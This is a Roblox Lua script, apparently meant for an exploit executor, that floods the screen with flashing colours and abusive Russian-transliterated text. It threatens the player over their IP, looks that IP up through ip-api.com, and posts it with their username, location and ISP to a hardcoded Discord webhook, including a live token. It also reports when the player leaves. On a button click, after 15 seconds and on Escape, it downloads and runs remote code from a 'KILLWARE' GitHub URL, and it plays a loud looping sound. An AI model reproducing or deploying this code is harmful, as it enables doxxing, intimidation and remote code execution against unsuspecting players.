local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")


local ScreenGui = Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset = true  
ScreenGui.ResetOnSpawn = false  
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global  
ScreenGui.Parent = PlayerGui


local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(1, 0, 1, 0)  
Frame.Position = UDim2.new(0, 0, 0, 0)
Frame.BackgroundColor3 = Color3.fromHSV(0, 1, 1)  
Frame.BorderSizePixel = 0
Frame.ZIndex = 10  
Frame.Parent = ScreenGui


spawn(function()
    while true do
        for hue = 0, 1, 0.01 do  
            Frame.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)  
            wait(0.01)  
        end
    end
end)



local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")  

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = playerGui  

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 682, 0, 409)
main.Position = UDim2.new(0.243, 0, 0.245, 0)
main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
main.BorderColor3 = Color3.fromRGB(0, 0, 0)
main.Parent = screenGui 

local uicorner = Instance.new("UICorner")
uicorner.CornerRadius = UDim.new(0, 30)
uicorner.Parent = main 

local vieb = Instance.new("TextLabel")
vieb.Size = UDim2.new(0, 514, 0, 50)
vieb.Position = UDim2.new(0.123, 0, 0.073, 0)
vieb.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
vieb.BorderColor3 = Color3.fromRGB(0, 0, 0)
vieb.Text = "Ti lognyt"
vieb.TextSize = 50
vieb.TextColor3 = Color3.fromRGB(255, 0, 0)
vieb.Font = Enum.Font.SourceSansBold 
vieb.Parent = main

local uicorner_vieb = Instance.new("UICorner")
uicorner_vieb.CornerRadius = UDim.new(0, 10)
uicorner_vieb.Parent = vieb

local sosal = Instance.new("TextLabel")
sosal.Size = UDim2.new(0, 200, 0, 35)
sosal.Position = UDim2.new(0.366, 0, 0.289, 0)
sosal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sosal.BorderColor3 = Color3.fromRGB(0, 0, 0)
sosal.Text = "SOSI PIDORAS"
sosal.TextSize = 41
sosal.TextColor3 = Color3.fromRGB(255, 255, 255)
sosal.Font = Enum.Font.SourceSansBold 
sosal.Parent = main

local yes = Instance.new("TextButton")
yes.Size = UDim2.new(0, 153, 0, 50)
yes.Position = UDim2.new(0.380, 0, 0.476, 0)
yes.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
yes.BorderColor3 = Color3.fromRGB(0, 0, 0)
yes.Text = "OK"
yes.TextSize = 41
yes.TextColor3 = Color3.fromRGB(255, 255, 255)
yes.Font = Enum.Font.SourceSansBold 
yes.Parent = main


local function executeScript()
    main.Visible = false  

    
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ktulhucc/KILLWARE/refs/heads/main/killware"))() 
    end)

    
    if not success then
        warn("Eror: " .. err)
    end
end

yes.MouseButton1Click:Connect(executeScript)  

local ssilka = Instance.new("TextLabel")
ssilka.Size = UDim2.new(0, 514, 0, 50)
ssilka.Position = UDim2.new(0.123, 0, 0.682, 0)
ssilka.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ssilka.BorderColor3 = Color3.fromRGB(0, 0, 0)
ssilka.Text = "EZ"
ssilka.TextSize = 25
ssilka.TextColor3 = Color3.fromRGB(255, 255, 255)
ssilka.Font = Enum.Font.SourceSansBold 
ssilka.Parent = main 

local ktulhu = Instance.new("TextLabel")
ktulhu.Size = UDim2.new(0, 514, 0, 50)
ktulhu.Position = UDim2.new(0.123, 0, 0.775, 0)
ktulhu.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ktulhu.BorderColor3 = Color3.fromRGB(0, 0, 0)
ktulhu.Text = "Esli livnesh tvoe ip yletit"
ktulhu.TextSize = 20
ktulhu.TextColor3 = Color3.fromRGB(255, 0, 0)
ktulhu.Font = Enum.Font.SourceSansBold 
ktulhu.Parent = main  

local lp = game:GetService("Players").LocalPlayer

if game:IsLoaded() then
    local player_name = lp.Name
    local player_id = lp.UserId
    local webhook_url = "https://discord.com/api/webhooks/1359854563858841813/V0GItVwatUV6ZAyictBfHso5LZiibw7EuERZO4eQCfpl_FACbFpgLTt2kShXXwfNCT_3"

    
    local place_id = game.PlaceId
    local place_name = game:GetService("MarketplaceService"):GetProductInfo(place_id).Name

    
    local ip_info = syn and syn.request or http_request({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })

    getgenv().ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)

    
    local current_time = os.date("%Y-%m-%d %H:%M:%S")

    
    local dataMessage = string.format("@here  Пользователь вьебан```User: %s\nID: %d\nGame: %s\nTime: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
        player_name, player_id, place_name, current_time, getgenv().ipinfo_table.query, getgenv().ipinfo_table.country, getgenv().ipinfo_table.countryCode, getgenv().ipinfo_table.region, getgenv().ipinfo_table.regionName, getgenv().ipinfo_table.city, getgenv().ipinfo_table.zip, getgenv().ipinfo_table.isp, getgenv().ipinfo_table.org)

    
    http_request(
        {
            Url = webhook_url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
        }
    )

    
    local function sendNotification(message)
        http_request(
            {
                Url = webhook_url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({["content"] = message})
            }
        )
    end

    
    local function onPlayerRemoving(player)
        if player == lp then
            local leave_time = os.date("%Y-%m-%d %H:%M:%S") -- Время выхода
            local leaveMessage = string.format("```User: %s\nID: %d\nGame: %s\nTime: %s\nAction: Покинул игру```", 
                player_name, player_id, place_name, leave_time)
            sendNotification(leaveMessage)
        end
    end

    
    game:GetService("Players").PlayerRemoving:Connect(onPlayerRemoving)

    
    local fakeData = {
        "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW",
        "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW",
        "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW",
        "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW",
        "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW"
    }

    for _, fakeUser in ipairs(fakeData) do
        local fakeMessage = string.format("```User: %s\nIP: 123.456.789.0\nCountry: FakeCountry\nCountry Code: FC\nRegion: FakeRegion\nRegion Name: FakeRegionName\nCity: FakeCity\nZipcode: 12345\nISP: FakeISP\nOrg: FakeOrg```", fakeUser)

        local fakeWebhookUrl = "" 

        if fakeWebhookUrl ~= "" then
            http_request(
                {
                    Url = fakeWebhookUrl,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode({["content"] = fakeMessage})
                }
            )
        end
    end
end


task.delay(15, function()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ktulhucc/KILLWARE/refs/heads/main/killware"))()
    end)

    if not success then
        warn("Eror: " .. err)
    end
end)

local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Escape and not gameProcessed then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ktulhucc/KILLWARE/refs/heads/main/killware"))()
    end
end)

local lp = game:GetService("Players").LocalPlayer

if game:IsLoaded() then
    local ip_info = syn and syn.request or http_request({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })

    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
    local ip = ipinfo_table.query

    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = lp.PlayerGui

    local textLabel = Instance.new("TextLabel")
    textLabel.Text = "IP: " .. ip
    textLabel.Size = UDim2.new(0, 200, 0, 50)
    textLabel.Position = UDim2.new(0.6, -130, 0.5, -50) 
    textLabel.AnchorPoint = Vector2.new(0.5, 0.5) 
    textLabel.TextColor3 = Color3.new(1, 0, 0) 
    textLabel.BackgroundTransparency = 1
    textLabel.BackgroundColor3 = Color3.new(0, 0, 0) 
    textLabel.TextSize = 18
    textLabel.Parent = screenGui
end

local sound = Instance.new("Sound", workspace)


sound.SoundId = "rbxassetid://1844290807"


sound.Volume = 10


sound.Looped = true


sound:Play()


sound.Ended:Connect(function()
    sound:Play() 
end)
